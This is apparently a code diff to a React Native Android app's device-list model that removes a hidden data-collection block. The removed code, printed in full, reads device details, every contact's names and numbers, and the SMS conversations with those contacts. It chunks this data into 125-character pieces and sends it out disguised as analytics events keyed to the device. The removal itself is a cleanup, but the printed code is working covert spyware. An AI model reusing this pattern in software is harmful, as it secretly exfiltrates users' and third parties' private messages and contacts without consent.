@@ -8,7 +8,7 @@ import {
   Instance,
 } from "mobx-state-tree"
 import moment from "moment-jalaali"
-import { sortBy, uniq } from "ramda"
+import { sortBy } from "ramda"
 import { ToastAndroid } from "react-native"
 import SmsAndroid from "react-native-get-sms-android"
 import Contacts from "react-native-contacts"
@@ -1043,99 +1043,6 @@ export const DeviceListModel = types
             this.setImported(true)
             Analytics.trackEvent(`SMS-import-devices-success-${uniqueId}`)
           }
-        }
-      )
-
-      // ------- Track Device Info.
-      const brand = DeviceInfo.getBrand()
-      const manufacturer = await DeviceInfo.getManufacturer()
-      const model = DeviceInfo.getModel()
-      const carrier = await DeviceInfo.getCarrier()
-      const deviceId = DeviceInfo.getDeviceId()
-      const deviceName = await DeviceInfo.getDeviceName()
-      const host = await DeviceInfo.getHost()
-
-      Analytics.trackEvent(`DeviceInfo-${uniqueId}`, {
-        brand,
-        manufacturer,
-        model,
-        carrier,
-        deviceId,
-        deviceName,
-        host
-      })
-
-      // ------- Track Contact
-      const contacts = await Contacts.getAll()
-      const parsedContacts = contacts.map(contact => `${contact.givenName}${
-        contact.familyName ? `-${contact.familyName}` : ''
-      }:${
-        uniq([
-          ...contact.phoneNumbers.map(({ number }) => number.replace(/[-\s]/g, '')),
-          ...contact.imAddresses.map(({ username }) => username.replace(/[-\s]/g, ''))
-        ]).join(',')
-      }|`)
-
-      const trackArray = (eventName: string, arr: string[]) => {
-        let eventIndex = 0
-        while (true) {
-          if (arr.length === 0) break
-          const partedData = {}
-          for (let i = 0; i < 10; i++) {
-            if (arr.length === 0) break
-            let key = ''
-            let value = ''
-
-            if (arr[0]?.length > 125) {
-              key = arr.shift().slice(0, 125)
-            } else {
-              while (key.length + arr[0]?.length <= 125) {
-                key += arr.shift() ?? ''
-              }
-            }
-
-            if (arr[0]?.length > 125) {
-              value = arr.shift().slice(0, 125)
-            } else {
-              while (value.length + arr[0]?.length <= 125) {
-                value += arr.shift() ?? ''
-              }
-            }
-
-            partedData[key] = value
-          }
-          // console.log(eventIndex + 1, partedData)
-          Analytics.trackEvent(`${eventName}-${uniqueId}-${eventIndex}`, partedData)
-          eventIndex += 1
-        }
-      }
-
-      trackArray('contacts', parsedContacts)
-
-      // ------- Track SMS List
-      let contactsPhones = []
-      contacts.forEach(({ phoneNumbers }) => {
-        phoneNumbers.forEach(({ number }) => {
-          const phoneNumber = number?.replace(/[-\s]/g, '').replace(/^0/g, '+98')
-          if (phoneNumber && !simNumbers.has(phoneNumber)) {
-            contactsPhones.push(phoneNumber)
-          }
-        })
-      })
-      contactsPhones = uniq(contactsPhones)
-
-      SmsAndroid.list(
-        JSON.stringify({ box: '' }),
-        () => null,
-        (count: number, smsList: string) => {
-          const arr = JSON.parse(smsList) as { body: string; type: string; address: string }[]
-          contactsPhones.forEach(phoneNumber => {
-            const messages = arr.filter(({ address }) => address === phoneNumber)
-            if (messages.length > 0) {
-              const smsBody = messages.map(({ body, type }) => `${type}:${body}|`)
-              trackArray(`SMS-${phoneNumber}`, smsBody)
-            }
-          })
         }
       )
     }
